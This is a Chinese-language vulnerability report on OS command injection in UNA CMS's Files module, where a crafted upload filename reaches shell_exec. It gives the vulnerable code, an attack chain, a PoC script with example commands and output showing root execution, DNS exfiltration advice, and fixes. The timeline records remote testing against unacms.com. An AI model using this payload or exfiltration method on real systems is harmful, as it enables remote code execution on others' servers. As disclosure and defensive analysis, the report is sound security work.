# UNA CMS BxFilesModule 命令注入漏洞分析报告

> 版本：v2（2026-09-12 更新）
> 本次更新基于**本地 Docker 部署的端到端真实 HTTP 复现**，补充了「普通用户自助注册 → 登录 → 上传 → 提交条目 → cron 触发」的完整利用链，并纠正了 v1 中关于 Java 依赖与 OOB payload 的若干不准确描述。

## 概述

| 属性 | 详情 |
|------|------|
| **漏洞编号** | （待分配 CVE） |
| **漏洞类型** | CWE-78: OS Command Injection |
| **影响版本** | UNA CMS ≤ 15.0.0-RC1 |
| **CVSS 3.1** | **8.8 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |
| **权限要求** | Post-auth（普通用户即可；UNA 默认开放公开注册，注册即自动登录，无需邮箱确认） |
| **验证状态** | **本地 Docker 部署端到端已验证**（真实 HTTP 表单 + 真实 cron，`data` 字段回写 `uid=0(root)`） |
| **漏洞文件** | `modules/boonex/files/classes/BxFilesModule.php:242,249-250`（存储层 `inc/classes/BxDolStorage.php` `getFileExt()` / `isValidExt()`） |

## 漏洞描述

UNA CMS 的 Files 模块（`bx_files`）在 `serviceProcessFilesData()` 中调用 `shell_exec()` 执行 Java Tika 做文件内容提取时，把**由用户上传文件名派生出的文件扩展名**直接拼进 shell 命令字符串，未做任何转义或过滤。扩展名提取函数 `pathinfo($filename, PATHINFO_EXTENSION)` 会完整保留 shell 元字符（`"` `;` `#` `$()` 等），而 `isValidExt()` 用 `in_array()` 对黑名单做精确匹配，导致攻击者可用特制文件名绕过扩展名黑名单并注入任意 shell 命令。

## 受影响代码

### 1. 扩展名提取 — `inc/classes/BxDolStorage.php`（`getFileExt()`）

```php
public function getFileExt($sName)
{
    return strtolower(pathinfo($sName, PATHINFO_EXTENSION));
}
```

`PATHINFO_EXTENSION` 返回文件名中**最后一个 `.` 之后的所有字符**，包含 `"` `;` `#` `$()` 等 shell 元字符。例如文件名 `evil.pdf";id;#` 返回 `pdf";id;#`。

### 2. 扩展名校验 — `inc/classes/BxDolStorage.php`（`isValidExt()`）

```php
public function isValidExt($sExt, $sType = '')
{
    $aExtDeny = $this->getExtDeny($sType);
    return !in_array($sExt, $aExtDeny);   // 精确匹配，不做转义/正则过滤
}
```

`pdf";id;#` 不在任何黑名单中 → 绕过。调用点在 `BxDolStorage::storeFile()`：

```php
$sExt = $this->getFileExt($oHelper->getName());   // 来自用户可控文件名
if (!$this->isValidExt($sExt)) { /* 拒绝 */ }
...
$this->_oDb->addFile(..., $sExt, ...);            // 原样落库
```

### 3. 命令拼接 — `modules/boonex/files/classes/BxFilesModule.php:242,249-250`

```php
// 行 223 前置门控
if (!defined('BX_SYSTEM_JAVA') || !constant('BX_SYSTEM_JAVA'))
    return;

// 行 242: 文件路径拼接（扩展名直接拼入）
$sFilePath = BX_DIRECTORY_PATH_TMP . $aFile['remote_id'] . '.' . $aFile['ext'];

// 行 249-250: shell 命令拼接（路径直接拼入，无转义）
$sCommand = '"' . constant('BX_SYSTEM_JAVA') . '" -Djava.awt.headless=true '
    . '-jar "' . $this->_oConfig->getHomePath() . 'data/tika-app.jar" '
    . '--encoding=UTF-8 --text "' . $sFilePath . '"';
$sData = shell_exec($sCommand);
```

> 注：`$aFile['ext']` 由 `getContentFile()` 从 storage 记录取得（`BxDolStorage::getFile($file_id)`），即第 2 步落库的恶意扩展名。

## 攻击链（本地已验证）

```
0. 攻击者自助注册普通用户 /create-account（默认开放注册；注册成功即下发已认证会话，无需邮箱确认）
        │
1. （如需）登录 /member.php 获取 memberSession
        │
2. 上传文件，文件名: evil.pdf";<PAYLOAD>;#
   POST /storage_uploader.php?uo=sys_html5&so=bx_files_files&a=upload&file=<urlencode(name)>
        │
3. pathinfo() 提取扩展名: pdf";<PAYLOAD>;#
   isValidExt(): in_array() 精确匹配黑名单 → 绕过 ✓
   扩展名原样写入 bx_files_files.ext
        │
4. 提交 Files 条目（真实前端表单）
   POST /create-file  with  attachments[]=<file_id>, cat=<合法分类>, csrf_token=<token>
   → bx_files_main 新行: author=<用户 profile>, file_id=<恶意文件>, data_processed=0
        │
5. cron (* * * * *) → BxFilesCronProcessData::processing()
   → BxDolService::call('bx_files','process_files_data')
   → serviceProcessFilesData()
        │
6. $sFilePath = "/tmp/<remote_id>.pdf";<PAYLOAD>;#
   @file_put_contents($sFilePath, ...) 成功（无 '/' 才可达）
        │
7. shell_exec("\"/usr/bin/java\" ... --text \"/tmp/<remote_id>.pdf\";<PAYLOAD>;#\"")
   ┌───────────────────────────────────────────────┤
   │ /usr/bin/java ... --text "/tmp/<id>.pdf"       │ ← java 正常项（缺失也只是报错）
   │ ; <PAYLOAD> ;                                  │ ← 注入命令被执行
   │ #"                                             │ ← 后续内容被注释
   └───────────────────────────────────────────────┘
   shell_exec 捕获 stdout → 写回 bx_files_main.`data`
```

## PoC 验证

### 完整链路 PoC：`poc_una_rce_fullchain.py`（本轮新增）

PoC 全程走真实 HTTP 表单（含 CSRF），依次完成：**注册 → 自动登录/登录 → 恶意文件名上传 → 提交 Files 条目 → 等待 cron → 读回命令输出**。

```bash
# 实验环境（内联 payload，读回 bx_files_main.data）
python3 poc_una_rce_fullchain.py --base-url http://localhost --payload 'id' --verify-db --wait 150

# 真实目标（DNS 外带；payload 不能含 '/'）
python3 poc_una_rce_fullchain.py --base-url https://target.example --oob-host <你的dns域>
```

### 本地端到端实测结果（已验证）

```
=== [1/4] 注册普通用户 ===
[+] 注册请求已提交: poc_1789192284@example.com
=== [2/4] 登录取会话 ===
[+] 会话已认证（注册后自动登录），跳过登录表单
=== [3/4] 上传恶意文件名 (扩展名绕过) ===
[+] 上传成功 file_id=23  (filename='evil.pdf";id;#')
=== [4/4] 提交 Files 条目 (data_processed=0) ===
[+] 已提交 Files 条目 (attachments[]=23)
=== 轮询等待 cron (真实容器 una-cron-1) ===
        id: 12   author: 8   file_id: 23   data_processed: 1
        data: uid=0(root) gid=0(root) groups=0(root)
>>> 命令注入 -> RCE 确认：shell_exec 捕获的注入命令输出已回写 bx_files_main.`data` <<<
```

- 数据库旁证：`bx_files_files` 落库 `file_name=evil.pdf";id;#`，`ext=pdf";id;#`，`profile_id=<普通用户>`。
- 触发方式：**未手工调用服务**，由部署中的真实 cron 容器自动处理（轮询观察 5–25s 内 `data_processed` 0→1）。
- 同时确认：`bx_files_process_data` 存在于 `sys_cron_jobs`（`* * * * *`）。

### 关键实现约束（实测）

1. **payload 不能含 `/`**：`$sFilePath` 随后会被 `@file_put_contents()` 当多级路径创建；含 `/` 时中间目录不存在 → 创建失败 → `file_exists()` 为假 → `continue`，`shell_exec` 根本不会到达。
   → 因此 v1 报告中的 `curl https://…` / `wget https://…` 型 OOB payload **不可达**；应使用无 `/` 的内联命令（如 `id`）或 DNS 外带（`nslookup <data>.<domain>`、`ping -c1 <data>.<domain>`）。
   → 另注意：`base64` 输出可能含 `/`，直接拼接有风险，建议用 hex/去 `/` 处理或不走 base64。
2. **CSRF token 单次有效**：`sys_security_form_token_enable=on`，每个表单（注册/登录/建条目）都需先 GET 页面取新的 `csrf_token`。
3. **注册即自动登录**：`sys_account_autoapproval=on` 下注册成功即下发已认证 `memberSession`；且实测 `email_confirmed=0 / active=0` 也能登录并完成利用，**无需邮箱确认**。
4. **Java 不是必要条件**：见下节条件 [3]。

## 利用条件详细分析

### 条件链

```
[1] UNA CMS 实例
     └─ 目标运行 UNA CMS

[2] Files 模块 (bx_files) 完整安装
     └─ 必要条件：bx_files 模块经安装器完整安装
     └─ 判定方式：storage_uploader.php?uo=sys_html5&so=bx_files_files&a=upload
                   → 返回 {"success":1} 才算通过
     └─ 误判陷阱：show_uploader_form 返回 200 不可靠（bx_files_files 存储对象可能作为
                   残留 DB 记录存在，但模块文件/cron 可能已缺失）

[3] BX_SYSTEM_JAVA 已定义且非空（注意：Java 二进制本身不是必要条件）
     └─ 门控：serviceProcessFilesData() 开头 `if(!defined('BX_SYSTEM_JAVA') || !constant('BX_SYSTEM_JAVA')) return;`
              inc/header.inc.php 默认 `define('BX_SYSTEM_JAVA', $_ENV['UNA_JAVA_PATH'] ?? '/usr/bin/java')`
              → 默认即为非空，正常安装下门控通过
     └─ 影响：本地实测容器内 **无 /usr/bin/java**，触发时输出 `sh: 1: /usr/bin/java: not found`，
              但 `;` 是独立命令分隔符，分号后的注入命令**照常执行**，RCE 成立
     └─ 结论：v1 报告"需有效 Java 二进制"的描述不准确；本 payload 形式下 Java 缺失不影响利用

[4] cron 正常运行
     └─ 必要条件：系统 crontab 每分钟调用 periodic/cron.php
     └─ cron job 注册：sys_cron_jobs 中存在 bx_files_process_data (* * * * * → BxFilesCronProcessData)
     └─ 本地已验证：真实 cron 容器自动触发并完成处理

[5] 认证凭据
     └─ 必要条件：有效登录 session（普通用户即可）
     └─ 缓解：UNA 默认开放公开注册（sys_account_autoapproval=on），注册即自动登录
```

### 远程利用前置条件总结

| 步骤 | 条件 | 本地 Docker（已验证） |
|------|------|:---------------------:|
| 注册 | 站点开放注册（默认） | ✅ `POST /create-account` |
| 登录 | 自动登录或账号密码登录 | ✅ 注册即自动登录 |
| 上传 | `storage_uploader.php?a=upload` 可用 | ✅ `{"success":1}` |
| 绕过 | `pathinfo` + `in_array` 黑名单 | ✅ `ext=pdf";id;#` 原样落库 |
| 建条目 | Files 条目创建（`attachments[]`） | ✅ `bx_files_main` `data_processed=0` |
| 触发 | `serviceProcessFilesData()` 经 cron | ✅ 真实 cron 容器自动处理 |
| 执行 | `shell_exec` 到达并执行 | ✅ `data=uid=0(root)` |

**结论**：扩展名绕过机制通用成立；完整攻击链（注册→上传→建条目→cron→执行）已在本地部署逐段验证。

> 对远程目标，仍受以下限制：注册是否开放、Files 模块是否完整安装、cron 是否运行、`shell_exec` 是否被禁用 —— 这些均无直接远程读取手段，需结合 OOB 回连（无 `/` 的 DNS 外带）判断。

## 修复建议

### 短期修复（高优先级）

在 `BxFilesModule::serviceProcessFilesData()` 中对 `$sFilePath` 使用 `escapeshellarg()`：

```php
// 修复前 (行 249-250)
$sCommand = '"' . constant('BX_SYSTEM_JAVA') . '" ... --text "' . $sFilePath . '"';

// 修复后
$sCommand = '"' . constant('BX_SYSTEM_JAVA') . '" ... --text ' . escapeshellarg($sFilePath);
```

### 中期加固

在 `isValidExt()` 中增加正则过滤，拒绝包含 shell 元字符的扩展名：

```php
public function isValidExt($sExt, $sType = '')
{
    if (preg_match('/["\'`;$|&(){}<>\\[\\]!#~\\\\*?\\n\\r]/', $sExt))
        return false;
    return !in_array($sExt, $this->getExtDeny($sType));
}
```

### 长期加固

- 使用 `proc_open()` + 参数数组替代 `shell_exec()` + 字符串拼接；
- 文件路径/临时文件名仅使用系统生成的 ID，不包含任何用户输入；
- 考虑用 PHP 原生库（如 `phpoffice/tika-client`）替代 CLI 调用 Tika。

## 受影响模块与条件

| 条件 | 说明 | 远程可检测 |
|------|------|:----------:|
| Files 模块安装 | 必须完整安装 `bx_files`（仅 storage 记录残留无效） | 部分（需 upload 验证） |
| BX_SYSTEM_JAVA | 常量已定义且非空（正常安装默认满足；**Java 二进制缺失不阻断利用**） | ❌ |
| cron 调度 | 系统 crontab 调用 `periodic/cron.php`，且 `sys_cron_jobs` 含 `bx_files_process_data` | ❌ |
| 认证 | 需登录用户（默认 `sys_account_autoapproval=on` 开放注册，注册即自动登录） | ✅ |
| shell_exec | PHP 未禁用 `shell_exec` | ❌ |

> **远程检测局限性**：Files 模块是否"真正可用"只能通过 `storage_uploader.php?a=upload&so=bx_files_files` 的实际写入结果判断；`show_uploader_form` 返回 200 不可靠（可能为残留 DB 记录）。

## 本地复现环境说明（附录）

- 部署：`docker-compose.yml`（项目 `una`）：nginx `una-web-1:80` → php-fpm `una-php-1`；DB `una-db-1`（别名 `db`，库 `una`）；cron `una-cron-1`。
- 为让前端表单（注册/登录/建条目页）正常渲染（这些页面经 `BxDolTemplate::_lessCss()` 需要 Less 编译器、表单校验需要 HTMLPurifier），本地补齐了缺失的 composer 依赖：
  - `plugins/wikimedia/less.php`（v5.5.1，与 `composer.lock` 一致）
  - `plugins/ezyang/htmlpurifier`
  - 在 `plugins/autoload.php` 末尾追加这两个库的 autoloader 注册（未改动原有 classmap）
  - 本地部署配置 `inc/header.inc.php` 的 `BX_DOL_URL_ROOT` 由 `http://localhost:8080/` 调整为 `http://localhost/`
- 以上仅为**本地实验环境修复**，与漏洞本身无关，未改动漏洞产品代码。

## 时间线

| 日期 | 事件 |
|------|------|
| 2026-07-21 | 源码审计发现漏洞 |
| 2026-07-21 | 本地 PoC 验证 `uid=0(root)` |
| 2026-07-22 | unacms.com 远程测试：扩展名绕过确认，OOB 无回调 |
| 2026-07-22 | Docker 完整攻击链复现 + OOB 外带验证 |
| 2026-07-22 | 三目标对比测试，确认 Files 模块远程检测存在虚假阳性 |
| 2026-07-22 | FOFA 指纹 + 检测方法论完善 |
| 2026-09-12 | **本地部署全链路（注册→登录→上传→建条目→真实 cron）端到端复现确认**；输出完整 PoC `poc_una_rce_fullchain.py`；纠正 Java 依赖与 `/` 型 payload 描述 |
